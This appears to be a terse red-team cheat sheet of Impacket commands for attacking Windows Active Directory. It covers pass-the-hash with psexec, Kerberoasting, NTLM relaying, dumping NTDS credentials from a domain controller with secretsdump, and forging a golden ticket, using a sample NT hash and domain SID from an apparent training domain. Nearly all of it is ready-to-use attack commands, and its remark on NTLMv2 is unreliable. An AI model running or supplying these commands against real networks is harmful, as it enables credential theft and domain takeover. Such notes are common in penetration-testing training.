impacket

Passing the hash only works with NTLM, not NTLMv2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-psexec "username":password@ipaddress
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-psexec "username":@ipaddress -hashes FullNTLM:Hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-GetUserSPNs Domain/Username:Password -dc-ip [Domain Controller IP] -request
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-smbserver share 'pwd' -smb2support
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-rpcdump @victimIP | egrep 'MS-RPRN|MS-PAR'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~
impacket-ntlmrelayx -smb2support -tf targets.txt
~~~

~~~
Impacket-GetUserSPNs FQDN/Username:Password -output tgs.txt -dc-ip DC_IP
~~~

~~~
impacket-ticketconverter user.kirbi user.ccache
~~~

dumping ntds from DC using ccache and secrets dump:

~~~
KRB5CCNAME=/home/kali/user.ccache impacket-secretsdump -k -no-pass -dc-ip DC_IP -target-ip DC_IP Server.FQDN
~~~

~~~
impacket-ticketer -nthash 26bddd6c25e8ee0f6bbbcf6d9c5e4c26 -domain-sid S-1-5-21-4221735399-2339777703-2054613801 -domain training.rt.bluebastion.net da.admin
~~~

~~~
impacket-ntlmrelayx -tf targets.txt -smb2support -socks --output-file hashes.txt
~~~

